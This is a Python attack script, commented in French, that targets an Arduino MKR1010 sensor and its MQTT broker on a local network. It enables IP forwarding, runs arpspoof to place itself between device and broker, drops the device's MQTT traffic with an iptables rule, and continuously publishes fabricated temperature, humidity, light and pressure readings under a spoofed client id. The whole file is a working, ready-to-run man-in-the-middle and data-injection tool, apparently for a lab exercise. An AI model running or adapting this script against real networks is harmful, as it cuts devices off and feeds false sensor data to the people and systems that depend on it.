"""
MQTT Attack - Block Real Data + Inject Fake Data
Bloque le MKR1010 et injecte des fausses données simultanément
"""

import paho.mqtt.client as mqtt
import json
import random
import time
import subprocess
import signal
import sys
import os
from datetime import datetime

# ============================================
# CONFIGURATION - À MODIFIER
# ============================================
BROKER_IP = "192.168.4.10"      # IP du broker MQTT
BROKER_PORT = 1883
MQTT_TOPIC = "iot/mkr1010/sensors"

MKR1010_IP = "192.168.4.2"      # IP du MKR1010 à bloquer
INTERFACE = "eth0"              # Interface réseau (wlan0 ou eth0)

# Credentials MQTT (optionnel)
MQTT_USER = None
MQTT_PASS = None

# ============================================
# GESTION DU BLOCAGE RÉSEAU
# ============================================
class NetworkBlocker:
    """
    Bloque le trafic MQTT du MKR1010 vers le broker
    """
    def __init__(self, target_ip, broker_ip, interface):
        self.target_ip = target_ip
        self.broker_ip = broker_ip
        self.interface = interface
        self.arpspoof_process = None
        self.is_blocking = False
        
    def enable_ip_forward(self):
        """Active le forwarding IP"""
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         check=True, capture_output=True)
            print("[+] IP forwarding activé")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur activation IP forward: {e}")
            return False
    
    def start_arp_spoofing(self):
        """Démarre l'ARP spoofing"""
        try:
            print(f"[*] Démarrage ARP spoofing...")
            print(f"    Target: {self.target_ip} (MKR1010)")
            print(f"    Gateway: {self.broker_ip} (Broker)")
            
            # Vérifier si arpspoof est installé
            subprocess.run(["which", "arpspoof"], check=True, capture_output=True)
            
            # Démarrer arpspoof
            self.arpspoof_process = subprocess.Popen(
                ["sudo", "arpspoof", "-i", self.interface, "-t", self.target_ip, self.broker_ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(2) 
            print(f"[+] ARP spoofing actif (PID: {self.arpspoof_process.pid})")
            return True
            
        except FileNotFoundError:
            print("[-] arpspoof non trouvé. Installation:")
            print("    sudo apt-get install dsniff")
            return False
        except Exception as e:
            print(f"[-] Erreur ARP spoofing: {e}")
            return False
    
    def block_mqtt_traffic(self):
        """Bloque le trafic MQTT avec iptables"""
        try:
            cmd = [
                "sudo", "iptables", "-I", "FORWARD",
                "-s", self.target_ip,
                "-d", self.broker_ip,
                "-p", "tcp", "--dport", str(BROKER_PORT),
                "-j", "DROP"
            ]
            
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[+] Trafic MQTT bloqué: {self.target_ip} -> {self.broker_ip}:{BROKER_PORT}")
            self.is_blocking = True
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur blocage iptables: {e}")
            return False
    
    def start(self):
        """Démarre le blocage complet"""
        print("\n" + "="*60)
        print("BLOCAGE RÉSEAU DU MKR1010")
        print("="*60)
        
        if not self.enable_ip_forward():
            return False
        
        if not self.start_arp_spoofing():
            return False
        
        if not self.block_mqtt_traffic():
            self.stop()
            return False
        
        print("[+] Blocage réseau actif ✓")
        print(f"[+] Le MKR1010 ({self.target_ip}) ne peut plus envoyer de données MQTT\n")
        return True
    
    def stop(self):
        """Arrête le blocage"""
        print("\n[*] Arrêt du blocage réseau...")
        
        # Arrêter arpspoof
        if self.arpspoof_process:
            try:
                self.arpspoof_process.terminate()
                self.arpspoof_process.wait(timeout=5)
                print("[+] ARP spoofing arrêté")
            except:
                try:
                    self.arpspoof_process.kill()
                except:
                    pass
        
        # Retirer la règle iptables
        if self.is_blocking:
            try:
                cmd = [
                    "sudo", "iptables", "-D", "FORWARD",
                    "-s", self.target_ip,
                    "-d", self.broker_ip,
                    "-p", "tcp", "--dport", str(BROKER_PORT),
                    "-j", "DROP"
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                print("[+] Règle iptables supprimée")
            except:
                print("[-] Erreur suppression règle iptables")
        
        print("[+] Nettoyage terminé")

# ============================================
# INJECTION DE FAUSSES DONNÉES
# ============================================
class FakeDataInjector:
    """
    Injecte des fausses données MQTT
    """
    def __init__(self, broker_ip, broker_port, topic):
        self.broker_ip = broker_ip
        self.broker_port = broker_port
        self.topic = topic
        self.client = mqtt.Client(client_id="fake_mkr1010", clean_session=True)
        self.connected = False
        self.message_count = 0
        
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] Injector connecté au broker")
            self.connected = True
        else:
            print(f"[-] Échec connexion: {rc}")
    
    def connect(self):
        """Connexion au broker"""
        self.client.on_connect = self.on_connect
        
        if MQTT_USER and MQTT_PASS:
            self.client.username_pw_set(MQTT_USER, MQTT_PASS)
        
        try:
            self.client.connect(self.broker_ip, self.broker_port, 60)
            self.client.loop_start()
            
            # Attendre la connexion
            timeout = 5
            start = time.time()
            while not self.connected and (time.time() - start) < timeout:
                time.sleep(0.1)
            
            return self.connected
        except Exception as e:
            print(f"[-] Erreur connexion broker: {e}")
            return False
    
    def generate_fake_data(self):
        """Génère des fausses données de capteurs"""
        data = {
            "timestamp": datetime.now().isoformat(),
            "device_id": "mkr1010",
            "temperature": round(random.uniform(18, 28), 2),
            "humidity": round(random.uniform(40, 60), 2),
            "light": random.randint(300, 700),
            "pressure": round(random.uniform(990, 1020), 2),
            "status": "FAKE_DATA",
            "_injected": True
        }
        return data
    
    def inject_continuous(self, interval=5):
        """Injection continue de fausses données"""
        print("\n" + "="*60)
        print("INJECTION DE FAUSSES DONNÉES")
        print("="*60)
        print(f"[*] Topic: {self.topic}")
        print(f"[*] Intervalle: {interval}s")
        print("[*] Appuyez sur Ctrl+C pour arrêter\n")
        
        try:
            while True:
                fake_data = self.generate_fake_data()
                payload = json.dumps(fake_data)
                
                result = self.client.publish(self.topic, payload, qos=1)
                
                if result.rc == 0:
                    self.message_count += 1
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                          f"Injection #{self.message_count}: "
                          f"T={fake_data['temperature']}°C, "
                          f"H={fake_data['humidity']}%, "
                          f"L={fake_data['light']}")
                else:
                    print(f"[-] Échec publication")
                
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print(f"\n[*] Arrêt de l'injection")
            print(f"[*] Total messages injectés: {self.message_count}")
    
    def disconnect(self):
        """Déconnexion du broker"""
        self.client.loop_stop()
        self.client.disconnect()

# ============================================
# ATTAQUE COMPLÈTE
# ============================================
class CompleteAttack:
    """
    Combine blocage réseau + injection de données
    """
    def __init__(self):
        self.blocker = NetworkBlocker(MKR1010_IP, BROKER_IP, INTERFACE)
        self.injector = FakeDataInjector(BROKER_IP, BROKER_PORT, MQTT_TOPIC)
        
    def run(self, interval=5):
        """Lance l'attaque complète"""
        print("""
╔═══════════════════════════════════════════════════════════╗
║  MQTT ATTACK - Block Real + Inject Fake                   ║
╚═══════════════════════════════════════════════════════════╝
        """)
        
        print(f"\n[*] Configuration:")
        print(f"    - Cible à bloquer: {MKR1010_IP} (MKR1010)")
        print(f"    - Broker MQTT: {BROKER_IP}:{BROKER_PORT}")
        print(f"    - Topic: {MQTT_TOPIC}")
        print(f"    - Interface: {INTERFACE}")
        
        # Vérifier les privilèges root
        if os.geteuid() != 0:
            print("\n[-] Ce script nécessite les privilèges root")
            print("    Relancez avec: sudo python3 mqtt_complete_attack.py")
            return
        
        try:
            # Étape 1: Bloquer le MKR1010
            if not self.blocker.start():
                print("[-] Échec du blocage réseau. Abandon.")
                return
            
            time.sleep(2)
            
            # Étape 2: Connecter l'injector
            print("\n[*] Connexion de l'injector au broker...")
            if not self.injector.connect():
                print("[-] Échec connexion au broker. Abandon.")
                self.blocker.stop()
                return
            
            time.sleep(1)
            
            # Étape 3: Injection continue
            print("\n[✓] Attaque complète active!")
            print("[✓] Le broker ne reçoit QUE vos fausses données\n")
            
            self.injector.inject_continuous(interval)
            
        except KeyboardInterrupt:
            print("\n\n[!] Interruption détectée")
        except Exception as e:
            print(f"\n[-] Erreur: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Nettoyage et arrêt"""
        print("\n[*] Nettoyage en cours...")
        self.injector.disconnect()
        self.blocker.stop()
        print("\n[✓] Attaque terminée proprement")

# ============================================
# MAIN
# ============================================
def main():
    # Vérifier si root
    if os.geteuid() != 0:
        print("[-] Ce script doit être exécuté avec sudo:")
        print(f"    sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    # Créer et lancer l'attaque
    attack = CompleteAttack()
    
    # Gestion des signaux pour cleanup propre
    def signal_handler(sig, frame):
        print("\n[!] Signal reçu, arrêt...")
        attack.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Lancer avec intervalle configurable
    try:
        interval = float(input("\nIntervalle entre injections (secondes, défaut 5): ") or "5")
    except ValueError:
        interval = 5
    
    attack.run(interval)

if __name__ == "__main__":
    main()
